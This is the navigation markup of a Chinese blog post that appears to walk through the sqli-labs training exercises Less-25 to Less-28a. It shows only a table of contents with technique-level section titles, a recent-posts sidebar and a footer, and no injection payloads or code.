class="toc-link" href="#%E7%88%86%E8%A1%A8%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">爆表：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5%EF%BC%9A"><span class="toc-number">1.1.4.</span> <span class="toc-text">爆字段：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%EF%BC%9A"><span class="toc-number">1.1.5.</span> <span class="toc-text">爆数据：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">运算符绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-25a"><span class="toc-number">2.</span> <span class="toc-text">Less-25a</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EBool-GET-%E8%BF%87%E6%BB%A4AND-OR-%E6%95%B0%E5%AD%97%E5%9E%8B-%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.0.1.</span> <span class="toc-text">基于Bool_GET_过滤AND&#x2F;OR_数字型_盲注</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-26"><span class="toc-number">3.</span> <span class="toc-text">Less-26</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF-%E6%82%A8%E6%89%80%E6%9C%89%E7%9A%84%E7%A9%BA%E6%A0%BC%E5%92%8C%E6%B3%A8%E9%87%8A%E9%83%BD%E5%B1%9E%E4%BA%8E%E6%88%91%E4%BB%AC"><span class="toc-number">3.0.1.</span> <span class="toc-text">GET-基于错误-您所有的空格和注释都属于我们</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%BA%93%EF%BC%9A-1"><span class="toc-number">3.0.2.</span> <span class="toc-text">暴库：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%EF%BC%9A-1"><span class="toc-number">3.0.3.</span> <span class="toc-text">爆表：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-number">3.0.4.</span> <span class="toc-text">爆字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%EF%BC%9A-1"><span class="toc-number">3.0.5.</span> <span class="toc-text">爆数据：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8updatexml%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">用updatexml函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-26a"><span class="toc-number">4.</span> <span class="toc-text">Less-26a</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF-GET-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC-%E6%B3%A8%E9%87%8A-%E5%8D%95%E5%BC%95%E5%8F%B7-%E5%B0%8F%E6%8B%AC%E5%8F%B7-%E5%AD%97%E7%AC%A6%E5%9E%8B-%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.0.1.</span> <span class="toc-text">基于错误_GET_过滤空格&#x2F;注释_单引号_小括号_字符型_盲注</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-27"><span class="toc-number">5.</span> <span class="toc-text">Less-27</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF-GET-%E8%BF%87%E6%BB%A4UNION-SELECT-%E5%8D%95%E5%BC%95%E5%8F%B7-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">5.0.1.</span> <span class="toc-text">基于错误_GET_过滤UNION&#x2F;SELECT_单引号_字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%A4%A7%E5%B0%8F%E5%86%99%E6%B7%B7%E5%90%88%E7%BB%95%E8%BF%87%E5%8D%B3%E5%8F%AF"><span class="toc-number">5.0.2.</span> <span class="toc-text">直接大小写混合绕过即可</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-27a"><span class="toc-number">6.</span> <span class="toc-text">Less-27a</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%9B%B2%E6%B3%A8-GET-%E8%BF%87%E6%BB%A4UNION-SELECT-%E5%8F%8C%E5%BC%95%E5%8F%B7-%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">6.0.1.</span> <span class="toc-text">基于盲注_GET_过滤UNION&#x2F;SELECT_双引号_字符型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-28"><span class="toc-number">7.</span> <span class="toc-text">Less-28</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%EF%BC%8C%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%8C%E8%BF%87%E6%BB%A4%E4%BA%86union%E5%92%8Cselect%E7%AD%89%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">7.0.1.</span> <span class="toc-text">基于错误的，单引号字符型，过滤了union和select等的注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-28a"><span class="toc-number">8.</span> <span class="toc-text">Less-28a</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%9B%B2%E6%B3%A8%E7%9A%84%EF%BC%8C%E5%B8%A6%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%8C%E8%BF%87%E6%BB%A4%E4%BA%86union%E5%92%8Cselect%E7%AD%89%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">8.0.1.</span> <span class="toc-text">基于盲注的，带括号的单引号字符型，过滤了union和select等的注入</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/02/16/sql-55/" title="sql-55"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sql-55"/></a><div class="content"><a class="title" href="/2021/02/16/sql-55/" title="sql-55">sql-55</a><time datetime="2021-02-16T02:43:56.000Z" title="Created 2021-02-16 10:43:56">2021-02-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/12/sqli-labs-38-41/" title="sqli-labs-38-41"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqli-labs-38-41"/></a><div class="content"><a class="title" href="/2021/02/12/sqli-labs-38-41/" title="sqli-labs-38-41">sqli-labs-38-41</a><time datetime="2021-02-12T06:13:57.000Z" title="Created 2021-02-12 14:13:57">2021-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/08/sqli-labs-32/" title="sqli-labs-32、33"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqli-labs-32、33"/></a><div class="content"><a class="title" href="/2021/02/08/sqli-labs-32/" title="sqli-labs-32、33">sqli-labs-32、33</a><time datetime="2021-02-08T08:07:38.000Z" title="Created 2021-02-08 16:07:38">2021-02-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/08/sql-29-30-31/" title="sqlilabs-29,30,31"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqlilabs-29,30,31"/></a><div class="content"><a class="title" href="/2021/02/08/sql-29-30-31/" title="sqlilabs-29,30,31">sqlilabs-29,30,31</a><time datetime="2021-02-08T07:40:02.000Z" title="Created 2021-02-08 15:40:02">2021-02-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/04/sql-26-28/" title="sql-25-28"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sql-25-28"/></a><div class="content"><a class="title" href="/2021/02/04/sql-26-28/" title="sql-25-28">sql-25-28</a><time datetime="2021-02-04T07:40:05.000Z" title="Created 2021-02-04 15:40:05">2021-02-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By wdraemv</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
